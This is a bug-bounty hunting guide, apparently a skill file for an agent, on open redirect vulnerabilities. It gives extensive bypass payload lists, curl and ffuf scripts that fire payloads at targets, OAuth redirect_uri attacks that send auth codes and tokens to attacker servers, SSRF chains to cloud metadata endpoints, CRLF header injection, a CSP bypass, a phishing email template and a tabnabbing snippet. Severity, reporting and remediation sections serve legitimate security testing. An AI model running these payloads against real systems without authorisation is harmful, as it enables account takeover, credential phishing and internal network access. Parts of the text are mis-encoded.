---
name: open-redirect
description: Hunt Open Redirect vulnerabilities — reflected and path-based redirects, parameter and header injection, bypass table, OAuth/SSO chain to ATO, phishing chains, SSRF escalation, browser-differential bypasses. Use when testing redirect parameters (url, redirect, next, return, returnTo, continue, dest, destination, callback, redir, redirect_uri, checkout_url, success_url, logout), path-based redirects, OAuth flows, login/logout/signup/password-reset, or building ATO chains. Covers detection, bypass payloads, validation, severity, and reporting.
sources: hackerone_public
report_count: 13
---

# OPEN-REDIRECT — Open Redirect

## What it is

An Open Redirect happens when a web application redirects a user to a URL controlled by user input without proper validation. The attacker crafts a link that *starts with a trusted domain* but lands the victim on an attacker-controlled page, enabling phishing, OAuth token theft, and SSRF escalation.

```
https://target.com/redirect?url=https://evil.com
# If the response Location: https://evil.com (or the browser lands there) → vulnerable
```

**Severity baseline:** Open redirect alone is almost always **Low**. It becomes **Medium/High/Critical** only when chained (OAuth auth-code theft → ATO, server-side redirect → SSRF, session fixation). Never inflate. Some programs explicitly mark open redirects Out of Scope unless chained — check the program policy first.

---

## Where to find (high-value surfaces)

- Login / Logout (often `?next=`, `?returnTo=`, `?rurl=`, `?redirect=`)
- Signup / registration redirects
- Password reset flows
- OAuth / SSO / third-party auth (`redirect_uri`, `next`, `state`-adjacent)
- Payment gateways (`checkout_url`, `success_url`, `cancel_url`, `return_url`)
- Email verification links
- Path-based redirects (server rewrites `/<path>` → Location)
- Proxy/fetch endpoints that follow redirects server-side (SSRF escalation)

---

## Common parameters

```
?url=            ?redirect=        ?next=           ?return=
?returnTo=       ?continue=       ?dest=           ?destination=
?callback=       ?go=             ?forward=        ?location=
?target=         ?redir=          ?redirect_uri=   ?checkout_url=
?success_url=    ?cancel_url=     ?redir=          ?to=
?logout=         ?rurl=           ?uurl=           ?out=
?link=           ?jump=           ?view=           ?ref=
```

Examples from real reports:
```
/login?next=https://evil.com
/logout?returnTo=///evil.com/
/signup?enable_registration=true&uurl=...@evil.com
/accounts/login/github/?next=///google.com
/oauth/authorize?redirect_uri=https://evil.com/auth/...
/redirect?url=http://bing.com
```

---

## Attack surface discovery

```bash
# 1. Collect URLs (prior recon/crawl)
cat recon/$TARGET/urls.txt | gf redirect > recon/$TARGET/redirect-candidates.txt
# 2. Catch less common param names
grep -Ei "(\?|&)(return|next|dest|go|forward|location|to|jump|target|out|link|logout|rurl|uurl|redir|continue)" \
  recon/$TARGET/urls.txt >> recon/$TARGET/redirect-candidates.txt
sort -u -o recon/$TARGET/redirect-candidates.txt recon/$TARGET/redirect-candidates.txt

# 3. Path-based: any path that 301/302s
cat recon/$TARGET/httpx.txt | awk '{print $1}' | while read u; do
  curl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" --max-redirs 0 "$u" | grep -E "30[1278]"
done
```

Also inspect JS for client-side sinks:
```bash
grep -rEn "location *=|location\.(href|assign|replace)\(|window\.open\(" recon/$TARGET/ --include="*.js" \
  | grep -iE "location\.(hash|search)|URLSearchParams|getParameter|referrer"
# DOM-based open redirect: https://target/page#https://evil.com  or ?url=...
```

---

## Bypass table (from real reports + payload list)

| Technique | Payload | Report |
|---|---|---|
| Basic | `https://evil.com` | #311330 (Semrush) |
| Protocol-relative | `//evil.com` | #692154 (Vend) |
| Triple slash | `///evil.com` | #223326 (Weblate), #76738 (Zaption) |
| Backslash bypass | `/\\evil.com` | #2812583 (Tumblr) |
| At-sign confusion | `https://target.com@evil.com` | #2812583 |
| Backslash + at-sign | `https://evil.com\@target.com` | #2812583 |
| URL-encoded slash | `%2Fevil.com`, `/%2f%2f%2fbing.com/...` | #504751 (Omise) |
| URL-encoded dot | `google%2Ecom` | #311330 |
| Double encoding | `%252E`, `%252f` | #311330, #57163 (HackerOne) |
| Full percent-encoding | `http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D` | #311330 |
| Null byte | `evil.com%00target.com` | bypass table |
| Whitespace/tab/newline | `evil.com%09`, `%0a`, `%0d%0a//evil.com` | bypass table |
| Path-based redirect | `https://target.com/%2Fgoogle.com`, `https://target.com//google.com/` | #57163, #504751 |
| Path-based + query confusion | `https://target.com///bing.com/?target.com/?...` | #1213580 (Affirm) |
| Chained intermediary (trusted domain) | `https://victim.com/logout?return_url=https://checkout.shopify.com/<attacker_store_id>` | #159522 (Shopify) |
| Nested redirect param | `?redir=llink?url=https://twitter.com/` | #16718 (Slack) |
| OAuth redirect_uri swap | `redirect_uri=https://example.com/auth/...` | #3099816 (Lichess) |
| Browser differential | works in Firefox, blocked in Chrome (URL-encoding not normalized) | #1788006 (Expedia) |
| Trailing slash handling | `https://target.com//evil.com/` | #692154 (Vend) |

### Full payload list (bing.com as canary)

```
https://bing.com
https://bing.com/%2F
https://bing.com////
bing.com
//bing.com
/%0A/bing.com
/%0D/bing.com
/%09/bing.com
/+/bing.com
///bing.com
\\\\bing.com
/\\/bing.com/
https://bing.com/%2e%2e
https://bing.com/%2f..
https://bing.com/%09
https://bing.com/%0a
%0d%0a//bing.com
%0d%0a\\\\bing.com
%2fbing.com
/%2f%2fbing.com
/%252fbing.com
/%2e%2e/bing.com
/%2f..%2fbing.com
/%2f%2e%2e%2fbing.com
/%2f%2f%2f%2fbing.com
http://bing.com
/\\/bing.com
%2f%2fbing.com
%252f%252fbing.com
https:bing.com
https:///bing.com
/..\\bing.com
/..%2fbing.com
/http://bing.com
/http:/bing.com
/https:/%5cbing.com/
/https://%09/bing.com
/https://%5cbing.com
/https:///bing.com/%2e%2e
/https:///bing.com/%2f%2e%2e
/https://bing.com
/https://bing.com/
/https://bing.com/%2e%2e
/https://bing.com/%2e%2e%2f
/https://bing.com/%2f%2e%2e
/https://bing.com/%2f..
/https://bing.com//
/https:bing.com
/%2f%5c%2f%67%6f%6f%67%6c%65%2e%63%6f%6d/
/%5cbing.com
/%68%74%74%70%3a%2f%2f%67%6f%6f%67%6c%65%2e%63%6f%6d
/.bing.com
//%09/bing.com
//%5cbing.com
///%09/bing.com
///%5cbing.com
////%09/bing.com
////%5cbing.com
/////bing.com
/////bing.com/
////\\;@bing.com
////bing.com/
https://bing.com\@
bing.com\@
```

Use a **canary you control** (Burp Collaborator / your own domain) instead of `bing.com` when validating, so you can prove the victim actually landed on attacker infrastructure.

---

## Step-by-step hunting methodology

### Phase 1 — Basic test (parameter redirect)

```bash
COLLAB="https://YOUR-COLLAB.example"   # or https://evil.com
cat recon/$TARGET/redirect-candidates.txt | qsreplace "$COLLAB" | while read url; do
  LOC=$(curl -s -I --max-redirs 0 "$url" | grep -i "^location:")
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-redirs 0 "$url")
  [ -n "$LOC" ] && echo "$STATUS | $LOC | $url"
done
```

Also test the raw host/path forms:
```bash
curl -s -I --max-redirs 0 "https://$TARGET//evil.com/"
curl -s -I --max-redirs 0 "https://$TARGET/%2Fevil.com"
```

### Phase 2 — Bypass matrix

```bash
BASE="https://$TARGET/redirect?url="
for P in "https://evil.com" "//evil.com" "///evil.com" "/\\evil.com" \
         "https://$TARGET@evil.com" "https://evil.com%23.$TARGET" \
         "https://evil.com%09" "%2F%2Fevil.com" "%252f%252fevil.com" \
         "https:evil.com" "https:///evil.com" "/..%2fevil.com"; do
  LOC=$(curl -s -I --max-redirs 0 "${BASE}${P}" | grep -i "^location:")
  echo "$P  ->  $LOC"
done
```

Always re-test with the **browser** too — curl does not normalize URLs the way browsers do (Expedia #1788006). A payload that "fails" in curl may redirect in Firefox/Chrome.

### Phase 3 — DOM-based open redirect

```bash
# Find candidate sinks in JS
grep -rEn "location *=|location\.(href|assign|replace)\(|window\.open\(" recon/$TARGET/ --include="*.js" \
  | grep -iE "location\.(hash|search)|URLSearchParams|getParameter|referrer"
```
Confirm in a browser:
```
https://target.com/page#https://evil.com
https://target.com/page?url=https://evil.com
```
Common shape: `var u = new URLSearchParams(location.search).get('url'); location = u;`

### Phase 4 — OAuth / SSO chain (highest value)

```bash
# Find OAuth authorize endpoints
grep -i "oauth\|authorize\|redirect_uri\|sso\|callback" recon/$TARGET/urls.txt | head -40

# Swap redirect_uri to an attacker domain (or an open redirect on the trusted domain)
OAUTH="https://$TARGET/oauth/authorize"
curl -sv "$OAUTH?response_type=code&client_id=CLIENT_ID&redirect_uri=https://evil.com/cb" 2>&1 | grep -i "location:"
# Stronger: redirect_uri = open redirect on trusted domain → auth code leaks to attacker
curl -sv "$OAUTH?response_type=code&client_id=CLIENT_ID&redirect_uri=https://$TARGET/redirect%3Furl%3Dhttps%3A%2F%2Fevil.com" 2>&1 | grep -i "location:"
```

**Watch for consent screens** (Lichess #3099816): the provider may show the `redirect_uri` and ask the user to authorize. Even then, subtle domain typos (`lichess45455.com`) can phish. Note whether a confirmation screen exists and whether it can be bypassed.

### Phase 5 — Server-side redirect → SSRF escalation

If the app fetches the redirect target server-side (follows 302s), an open redirect becomes SSRF:

```bash
curl -s "https://$TARGET/proxy?url=https://evil.com/redirect-to-169.254.169.254/latest/meta-data/"
curl -s "https://$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/" -H "Cookie: $SESSION"
```

### Phase 6 — Trusted-intermediary chain (Shopify pattern)

Look for redirects through a *trusted* host that itself honors a user-controlled destination:
```
victim.com/logout?return_url=https://trusted.com/<id>   (trusted.com then redirects to attacker URL stored under <id>)
```
Test any `return_url`/`checkout_url` that points at a first-party subdomain or checkout host.

---

## Automation

```bash
# openredirex
pip3 install openredirex
openredirex -l recon/$TARGET/redirect-candidates.txt -p evil.com

# nuclei
nuclei -u https://$TARGET -t http/cves/... 2>/dev/null
nuclei -u https://$TARGET -tags redirect -severity low,medium,high

# gf + qsreplace + curl
cat recon/$TARGET/urls.txt | gf redirect | qsreplace "https://evil.com" | \
  xargs -I{} curl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" --max-redirs 0 {}

# open-redirect-scanner style: param mining
grep -rhoE "[?&](url|redirect|next|return|returnTo|continue|dest|destination|callback|go|forward|location|target|redir|to|checkout_url|success_url|cancel_url|redir|rurl|uurl)=[^&]*" \
  recon/$TARGET/urls.txt | sort -u
```

---

## Validation (prove it, don't assume)

✅ `Location` response header points to your controlled domain **or** the browser actually navigates there.
✅ Reproduce in a real browser (curl normalization differs — Expedia #1788006).
✅ For DOM-based: confirm the navigation happens client-side.
✅ For OAuth: show the auth code / token actually reaches attacker infrastructure (use a canary you control; never steal real tokens).
✅ For SSRF chain: show an internal/metadata response.
✅ For phishing chain: show the URL starts with the trusted domain but lands on attacker page.

**False-positive traps:**
- Redirects that show a warning/confirmation screen (Lichess) — may be considered not-a-vuln.
- Redirects only to same-origin/allowlisted hosts.
- Redirects that require authentication and only redirect after login to a fixed path.
- Programs that explicitly list open redirects as Out of Scope unless chained (Vend initially N/A; Shopify chained accepted).

---

## Chain table

| Open redirect finding | Chain to | Impact |
|---|---|---|
| Any open redirect | OAuth `redirect_uri` bypass | Auth code theft → ATO (High/Critical) |
| Any open redirect | Phishing URL with trusted domain | Social engineering (Low-Medium) |
| Server-side redirect | SSRF via followed redirect | Internal service access (High) |
| Logout redirect | Session fixation | Force login with known session (Medium) |
| Trusted-intermediary redirect | Stored malicious destination | Mass phishing (Medium-High) |
| Path-based redirect | Cache poisoning / WAF bypass | Varies |

---

## Severity guide

- Redirect alone: **Low** (most programs)
- Chains to OAuth code theft → ATO: **High/Critical**
- Phishing with brand name: **Low-Medium**
- Server-side → SSRF: **High**
- OAuth with consent screen only (no bypass): usually **not accepted** or Low

---

## Reporting notes (human tone, impact-first)

- Title formula: `Open Redirect via <param> on <endpoint> leading to <impact>`
- Always state whether it's reflected (param) or path-based.
- Include the exact PoC URL, the `Location` header, and a browser screenshot/video.
- For bypasses, list which normalization difference (curl vs Firefox vs Chrome) makes it work.
- For OAuth chains, include the modified `redirect_uri` and proof the code lands on attacker infra.
- Redact cookies/tokens/PII in evidence (see evidence-hygiene).
- Check program scope: some programs reject bare open redirects; lead with the chain.

---

## Real-world anchors (from disclosed reports)

- #1028345 HackerOne — open redirect (disclosed)
- #1213580 Affirm — `///google.com/?www.affirm.com/...` ($250, Low)
- #159522 Shopify — chained via checkout.shopify.com store redirect (Medium chain)
- #16718 Slack — `?redir=llink?url=https://twitter.com/` ($100)
- #1788006 Expedia — `?logout=` browser differential Firefox vs Chrome (Medium)
- #223326 Weblate — `?next=///google.com` in third-party auth (Medium)
- #2812583 Tumblr — `?redirect_to=https://evil.com\@www.tumblr.com` (Low)
- #3099816 Lichess — OAuth `redirect_uri` swap (duplicate, consent screen)
- #311330 Semrush — `/redirect?url=` with multiple encoding bypasses (Low)
- #504751 Omise — `/%2f%2f%2fbing.com/%3fwww.omise.co/` path-based ($100, Low)
- #57163 HackerOne — `/%2Fgoogle%252Ecom` double-encoded dot
- #692154 Vend — `//evil.com/` trailing slash (Medium, initially OOS)
- #76738 Zaption — `///evil.com/` and `http:///evil.com/` filter bypass


---

## Rifteo Techniques — redirect-forge

# Redirect Forge â€” Open Redirect

Open redirect occurs when an application redirects a user to a URL that is partially or fully controlled by attacker input, without proper validation. On its own it enables phishing. Chained with OAuth, SSRF, or CSP it becomes Critical.

---

## Phase 1 â€” Discover Redirect Parameters

Cast a wide net. Any parameter that accepts a URL or path is a candidate.

### 1.1 Common Parameter Names

```
redirect        redirect_url      redirect_uri      redirect_to
return          returnUrl         return_url        returnTo
next            next_url          goto              go
url             dest              destination       target
forward         fwd               location          link
out             exit              r                 redir
ref             referrer          continue          callback
back            from              login_redirect    post_login_url
```

### 1.2 Discovery via Passive Recon

```bash
# Collect all URLs from Wayback Machine and other crawlers
gau target.com | grep -iE "(redirect|return|next|goto|url|dest|redir|forward|target|callback|location)=" | sort -u | tee redirect-params.txt

# Same with waybackurls
waybackurls target.com | grep -iE "(redirect|return|next|goto|url=|dest=|redir=)" | sort -u

# Use gf pattern for open redirect
gf redirect redirect-params.txt

# Extract from JS files â€” sometimes redirect targets are constructed in JS
curl -s https://target.com/app.js | grep -iE "(window\.location|location\.href|location\.replace|location\.assign)" 
```

### 1.3 Discovery via Active Crawling

```bash
# Spider and find redirect params with katana
katana -u https://target.com -d 3 -silent | grep -iE "(redirect|return|next|goto|url=)" | sort -u

# Burp Suite: use Param Miner extension to discover hidden redirect parameters
# Burp â†’ Proxy â†’ HTTP history â†’ right-click â†’ Extensions â†’ Param Miner â†’ Guess params
```

### 1.4 HTTP Headers that Trigger Redirects

```
Referer:        https://evil.com           (some apps redirect back to Referer)
X-Original-URL: /login?next=https://evil.com
X-Forwarded-Host: evil.com                 (affects Location header on some apps)
Host:           evil.com                   (Host header injection â†’ redirect)
```

### 1.5 OAuth / SSO Redirect Parameters

```
redirect_uri    callback_url    callback_uri
post_logout_redirect_uri        end_session_endpoint
```

### 1.6 Confirm Reflection

Send a canary first â€” verify the parameter actually controls the redirect destination:

```bash
curl -v "https://target.com/login?next=https://CANARY.burpcollaborator.net" 2>&1 | grep -i location
# Expected: Location: https://CANARY.burpcollaborator.net
```

If the `Location` header reflects your input â†’ redirect parameter is controllable.

---

## Phase 2 â€” Verify Basic Open Redirect

Start with the simplest possible payload before reaching for bypasses.

```
https://target.com/login?next=https://evil.com
https://target.com/logout?redirect=https://evil.com
https://target.com/redirect?url=https://evil.com
https://target.com/go?to=https://evil.com
```

**Confirm:** the browser (or `curl -L`) ends up at `https://evil.com`.

**Signs of partial protection to bypass:**
- Only your input domain is accepted â†’ go to Phase 3 (allowlist bypass)
- Input is URL-decoded before comparison â†’ try double-encoding
- Input is regex-matched â†’ try alternate protocol or domain confusion

---

## Phase 3 â€” Bypass Techniques

Work through these systematically. Try each category before concluding the control is solid.

### 3.1 Protocol Substitution

```
//evil.com                        protocol-relative â€” inherits current scheme
///evil.com                       triple-slash â€” parsed differently by some browsers
////evil.com
https:evil.com                    colon without slashes
https:/evil.com                   single slash
javascript:alert(document.domain) XSS via redirect (if rendered in href/link)
data:text/html,<script>alert(1)</script>
```

### 3.2 Allowlist â€” Suffix Bypass (target.com is whitelisted)

```
https://evil.com?target.com         query string confusion
https://evil.com#target.com         fragment confusion
https://evil.com/.target.com        path segment mimicking subdomain
https://evil.com%2F@target.com      URL-encoded slash after domain
https://target.com.evil.com         subdomain lookalike
https://target.com@evil.com         credentials field (username = target.com)
https://evil.com\target.com         backslash parsed as separator on Windows apps
https://evilXtarget.com             substring match bypass
```

### 3.3 Allowlist â€” Prefix Bypass (https://target.com is whitelisted prefix)

```
https://target.com.evil.com         subdomain of attacker
https://target.com@evil.com         @-based bypass â€” host is evil.com
https://target.com%40evil.com       URL-encoded @
https://target.com%2F%2Fevil.com    encoded double-slash â†’ https://target.com//evil.com
```

### 3.4 @ Operator (Credentials Confusion)

```
https://target.com@evil.com         everything before @ is user info; host = evil.com
https://target.com:password@evil.com
@evil.com                           bare @ with no user info
```

### 3.5 URL Encoding Bypasses

```
%68%74%74%70%73%3A%2F%2Fevil.com    full URL-encoded
https%3A%2F%2Fevil.com              encoded colon and slashes
%2F%2Fevil.com                      encoded //
%09//evil.com                       tab character before //
%0a//evil.com                       newline before //
%0d//evil.com                       carriage return before //
%00//evil.com                       null byte
%E2%80%8B//evil.com                 zero-width space (U+200B)
```

### 3.6 Double URL Encoding

```
%2568%2574%2574%2570%2573%253a%252f%252fevil.com    double-encoded https://
%252F%252Fevil.com                                   double-encoded //evil.com
```

### 3.7 Unicode / Internationalized Bypasses

```
https://â“”vil.com                   Unicode letter lookalikes
https://evilã€‚com                   Unicode full-stop (ã€‚= U+3002) â€” IDNA normalization
https://xn--evil-rta.com            Punycode â€” renders as evÃ­l.com
https://EVIL.COM                    uppercase â€” some comparisons are case-sensitive
â„Žttps://evil.com                    Unicode â„Ž (U+210E, looks like h)
```

### 3.8 Path Traversal â€” Relative Redirects

When the app only accepts relative paths (`/dashboard`):

```
//evil.com                          treated as relative by some parsers
////evil.com
/\evil.com                          backslash â€” browser may normalize to /
/.//evil.com
/%09/evil.com
/..//evil.com
```

### 3.9 IPv6 / IP Confusion

```
https://[::1]                       IPv6 loopback
https://[::ffff:127.0.0.1]          IPv4-mapped IPv6
https://2130706433                  decimal notation for 127.0.0.1
https://0x7f000001                  hex notation for 127.0.0.1
https://017700000001                octal notation for 127.0.0.1
```

### 3.10 Parameter Pollution

```
?next=https://target.com&next=https://evil.com       last wins
?next=https://evil.com&next=https://target.com       first wins
?url=https://target.com%26url=https://evil.com        encoded & pollution
```

### 3.11 Fragment / Anchor Tricks

```
https://target.com/redirect?next=https://evil.com%23.target.com
# Server sees: next=https://evil.com#.target.com â†’ regex matches ".target.com" at end
# Browser navigates to: https://evil.com (fragment ignored)
```

### 3.12 Case Sensitivity

```
HTTPS://evil.com
Https://Evil.Com
hTtPs://EVIL.COM
```

### 3.13 CRLF Injection in Redirect (Header Injection)

When user input is placed in a `Location:` header without sanitization:

```
https://target.com/redirect?url=https://evil.com%0d%0aSet-Cookie:%20session=hijacked
https://target.com/redirect?url=https://evil.com%0d%0aX-Injected-Header:%20value
```

**Impact:** inject arbitrary HTTP response headers â†’ cookie fixation, cache poisoning.

---

## Phase 4 â€” OAuth redirect_uri Exploitation

OAuth open redirect is the highest-impact variant â€” it steals authorization codes and access tokens.

### 4.1 Understand the OAuth Flow

```
1. App sends user to:
   GET /oauth/authorize?client_id=APP&redirect_uri=https://target.com/callback&response_type=code

2. User logs in at IdP (Google, GitHub, Okta, etc.)

3. IdP redirects user to redirect_uri with code:
   GET https://target.com/callback?code=AUTH_CODE_HERE

4. App exchanges code for access token â†’ user is logged in
```

**Goal:** replace `redirect_uri` with your server â†’ you receive the auth code â†’ exchange it for a token â†’ account takeover.

### 4.2 redirect_uri Bypass Techniques

```bash
# Exact match bypass â€” use open redirect on the same domain
redirect_uri=https://target.com/redirect?next=https://evil.com

# Subdomain â€” if IdP accepts *.target.com
redirect_uri=https://attacker.target.com/callback

# Path traversal â€” if IdP only validates prefix
redirect_uri=https://target.com/callback/../../../evil

# Extra parameters
redirect_uri=https://target.com/callback?injected=https://evil.com

# Fragment
redirect_uri=https://target.com/callback%23.evil.com

# Domain confusion
redirect_uri=https://target.com.evil.com/callback
redirect_uri=https://target.com@evil.com/callback

# URL encoding
redirect_uri=https%3A%2F%2Fevil.com%2Fcallback

# Wildcard abuse â€” if app registers *.target.com
redirect_uri=https://evil.target.com/callback  â† if you control a subdomain
```

### 4.3 Chain: Open Redirect on Same Domain â†’ Token Theft

If the IdP whitelists `https://target.com/*` and `target.com` has an open redirect at `/go?to=`:

```
redirect_uri=https://target.com/go?to=https://evil.com
```

The auth code/token lands at `evil.com` via the `Referer` header or URL fragment.

### 4.4 Capturing the Token

Set up a listener:

```bash
# Python listener
python3 -m http.server 8080

# Or use ngrok for a public URL
ngrok http 8080
```

Craft the OAuth URL:

```
https://accounts.google.com/o/oauth2/auth?
  client_id=TARGET_CLIENT_ID&
  redirect_uri=https://YOUR_SERVER/callback&
  response_type=code&
  scope=email+profile
```

Victim clicks link â†’ IdP sends code to your server â†’ you exchange code for token.

### 4.5 Stealing Tokens via Referer

When `response_type=token` (implicit flow), the token lands in the URL fragment:

```
https://target.com/callback#access_token=TOKEN_HERE&token_type=Bearer
```

If `/callback` has an open redirect or includes external resources (analytics, CDN):

```html
<script src="https://analytics.evil.com/track.js"></script>
```

The browser sends `Referer: https://target.com/callback#access_token=TOKEN_HERE` to analytics server.

---

## Phase 5 â€” Chaining Open Redirect with Other Bugs

### 5.1 Open Redirect â†’ SSRF

When the server-side fetches the redirect target before sending the 302:

```bash
# Target internally resolves the URL before redirecting
GET /proxy?url=https://evil.com

# Chain to internal metadata endpoints
GET /proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
GET /proxy?url=http://internal-admin.target.com/api/admin/users
```

**Detection:** if response time changes for internal IPs vs external â€” server-side fetch confirmed.

### 5.2 Open Redirect â†’ CSP Bypass

When CSP uses `'nonce'` or `'strict-dynamic'` but the target domain is whitelisted as a redirect:

```
Content-Security-Policy: script-src https://target.com https://cdn.trusted.com
```

If `target.com` has an open redirect to an attacker-controlled page that serves JS:

```html
<script src="https://target.com/redirect?url=https://evil.com/malicious.js"></script>
```

Browser follows the redirect â†’ loads script from `evil.com` â†’ CSP bypassed.

### 5.3 Open Redirect â†’ Phishing Campaign

Full phishing chain leveraging brand trust:

```
Email to victim:
  "Click here to reset your password: https://target.com/reset?next=https://phishing-page.com"

User sees: target.com in the URL â†’ clicks â†’ lands on phishing page
```

Phishing page mimics `target.com` login form â†’ harvests credentials.

### 5.4 Open Redirect â†’ SAML/SSO Token Theft

In SAML flows with `RelayState` or `AuthnRequest`:

```xml
<samlp:AuthnRequest
  AssertionConsumerServiceURL="https://target.com/saml/callback?RelayState=https://evil.com">
```

If `RelayState` is used as a post-login redirect without validation â†’ open redirect post-authentication.

---

## Phase 6 â€” Blind Open Redirect

When the redirect is server-side only (302 is not visible to you) or affects another user's session:

### 6.1 Out-of-Band Detection

```bash
# Use Burp Collaborator or interactsh
GET /redirect?next=https://YOUR-OOB-DOMAIN.burpcollaborator.net
# Watch for DNS/HTTP callback â€” server fetched your URL
```

### 6.2 Time-Based (SSRF variant)

```bash
# Internal IP that takes longer to respond vs instant rejection
GET /redirect?next=http://10.0.0.1/
# Measure response time â€” delay indicates server attempted connection
```

---

## Phase 7 â€” Impact Escalation Map

| Chain | Severity | Conditions |
|---|---|---|
| Open redirect â†’ phishing | Medium | Standalone â€” brand trust abuse |
| Open redirect â†’ credential harvest | High | Convincing phishing + victim clicks |
| Open redirect â†’ OAuth token theft | Critical | OAuth implicit flow + redirect on same domain |
| Open redirect â†’ auth code theft | Critical | IdP whitelists domain + app has open redirect |
| Open redirect â†’ SSRF | Critical | Server fetches URL before redirecting |
| Open redirect â†’ CSP bypass + XSS | Critical | Trusted domain whitelisted in CSP |
| Open redirect â†’ CRLF injection | High | Input reflected in Location header unsanitized |
| Open redirect â†’ SAML redirect | High | RelayState not validated after SSO |
| Open redirect â†’ JWT/session leak | Critical | Token in URL + redirect hits external resource via Referer |

---

## Phase 8 â€” Automated Testing

```bash
# openredirex â€” purpose-built open redirect fuzzer
openredirex -l redirect-params.txt -p payloads.txt

# ffuf â€” fuzz redirect parameter values
ffuf -u "https://target.com/login?next=FUZZ" \
     -w references/payloads.txt \
     -mc 301,302,307,308 \
     -fr "target\.com"      # filter: drop responses that redirect back to target

# Use Burp Intruder on the redirect parameter with the payload list from references/payloads.txt

# gf + nuclei (open-redirect templates)
gau target.com | gf redirect | nuclei -t nuclei-templates/http/redirect/

# dalfox â€” also detects redirect to javascript: (XSS variant)
dalfox url "https://target.com/login?next=https://evil.com" --only-custom-payload
```

---

## Phase 9 â€” Confirm the Finding

- [ ] Redirect parameter identified and confirmed controllable (canary in Location header)
- [ ] Basic payload (`https://evil.com`) triggers redirect â€” OR â€” bypass payload succeeds
- [ ] Reproducible from a fresh browser session (no session dependency)
- [ ] Impact demonstrated: phishing URL works / token received on OOB server / SSRF confirmed
- [ ] Screenshot or video of browser navigating to attacker-controlled page

**False positive checks:**
- App redirects to a fixed list of URLs â€” not open redirect (enumerable, not injectable)
- App reflects the URL in HTML body only but doesn't redirect â€” different vuln class (reflected input)
- `Location` header present but `http_only_redirect` middleware blocks external domains downstream

---

## Phase 10 â€” Report Structure

```
Title: Open Redirect on [endpoint] â€” [Severity Justification, e.g., OAuth Token Theft]

Severity: Critical / High / Medium
  Critical: OAuth/SAML token theft, SSRF chain, CSP bypass â†’ XSS
  High:     Credential phishing with CRLF injection or session leak via Referer
  Medium:   Standalone open redirect for phishing (no token theft)
  Low:      Redirect to same domain, or requires user already authenticated

CWE: CWE-601 â€” URL Redirection to Untrusted Site ('Open Redirect')
OWASP: A01:2021 â€“ Broken Access Control

CVSS 3.1 Base (standalone phishing):   AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N  â†’ 6.1 (Medium)
CVSS 3.1 Base (OAuth token theft):     AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N  â†’ 8.7 (High/Critical)

Affected endpoint: GET https://target.com/login?next=[REDIRECT_TARGET]
Affected parameter: next

Steps to reproduce:
1. Navigate to: https://target.com/login?next=https://evil.com
2. Complete login (or simply follow the URL if no auth required)
3. Observe: browser is redirected to https://evil.com
   [For bypass payloads]: step 1 uses https://target.com@evil.com â€” note which bypass worked

For OAuth token theft:
1. Identify that target.com is an authorized redirect_uri for [OAuth provider]
2. Locate open redirect at https://target.com/go?to=
3. Construct: [OAuth auth endpoint]?client_id=[ID]&redirect_uri=https://target.com/go%3Fto%3Dhttps%3A%2F%2Fevil.com&response_type=token&scope=email
4. Victim clicks link â†’ completes OAuth â†’ auth code/token delivered to evil.com

Impact:
- [Phishing] Users are redirected to attacker-controlled page under the guise of [target.com]'s trusted URL
- [Token theft] Attacker receives OAuth access token â†’ full account takeover
- [SSRF] Attacker can probe internal network / cloud metadata endpoint
- [CRLF] Arbitrary headers injected into HTTP response

Evidence:
- HTTP request showing redirect parameter
- HTTP response showing Location: https://evil.com (or attacker's OOB domain)
- Screenshot/video of browser ending at attacker's page
- OOB server log showing DNS/HTTP callback for blind variant

Remediation:
- Maintain a server-side allowlist of permitted redirect destinations â€” reject anything else
  UNSAFE: return redirect(request.args['next'])
  SAFE:   ALLOWED = {'/dashboard', '/profile'}; next = request.args.get('next', '/'); return redirect(next if next in ALLOWED else '/')
- For relative redirects: accept only paths starting with '/' and reject '//'; validate with urllib.parse
- For OAuth redirect_uri: enforce exact string match â€” not prefix, not regex, not wildcard
- Remove redirect parameters entirely where not required â€” use POST-login redirect stored in session
- Validate URL components server-side: scheme must be https, host must be in allowlist
- Set Referrer-Policy: no-referrer on pages that receive tokens in URL fragments
```

---

## Quick-Reference: Priority Attack Order

1. **OAuth `redirect_uri`** â€” highest impact, test first on any app with SSO/OAuth login
2. **Post-login `?next=` / `?return=`** â€” most common; test basic payload then @-bypass and fragment bypass
3. **Logout redirect** â€” often less-validated; may bypass allowlists
4. **Password reset / email link redirects** â€” token in URL + redirect = instant account takeover
5. **`Referer`-based redirects** â€” `curl -H "Referer: https://evil.com"` to confirm
6. **Server-side URL fetch + redirect** â€” check for SSRF chain with internal IP payloads

---

## Reference Files

- `references/payloads.txt` â€” 100+ redirect bypass payloads (ready for ffuf/Intruder)
- `references/tools.md` â€” openredirex, gf, nuclei templates, Burp workflow
- `references/oauth-redirect-guide.md` â€” full OAuth redirect_uri attack methodology



---

## From hack-skills: Additional Open Redirect Techniques

### Tabnabbing (window.opener Attack)

When a page opens a new tab with `target="_blank"` without `rel="noopener"`:
`javascript
// Injected into the opened tab (via XSS on a linked site, or when attacker controls the linked page):
window.opener.location = "https://phishing.com/";
// Victim's original tab now shows attacker's page — credential theft
`

**Trigger**: Any link `<a href="X" target="_blank">` without `rel="noopener noreferrer"`.

**Bug class**: Mid-severity standalone; High when combined with clickjacking or social engineering.

### SSRF via Open Redirect Chain

`
1. App blocks direct SSRF to 169.254.169.254
2. App allowlists trusted.com
3. trusted.com has open redirect to any URL
4. Chain: ?url=https://trusted.com/redirect?to=http://169.254.169.254/latest/meta-data/
5. Server follows 302 → reaches metadata endpoint
`

**Multi-hop filter bypass:**
`
?url=https://trusted.com/r?to=https://trusted2.com/go?url=http://169.254.169.254/
`
Each hop passes allowlist check; final hop reaches target.

### URL Parser Differential Bypass Table

| Payload | Browser Host | Server Host | Why |
|---|---|---|---|
| `//evil.com` | evil.com | evil.com | Protocol-relative |
| `\/\/evil.com` | evil.com | evil.com | Backslash parsed as slash |
| `//evil.com\@target.com` | evil.com | target.com | Parser differential |
| `//target.com@evil.com` | evil.com | evil.com | Userinfo bypass |
| `%09//evil.com` | evil.com | evil.com | Tab before // |
| `evil.com%00.target.com` | evil.com | target.com | Null byte truncation |
| `https://evil.com#target.com` | evil.com | evil.com | Fragment ignored |
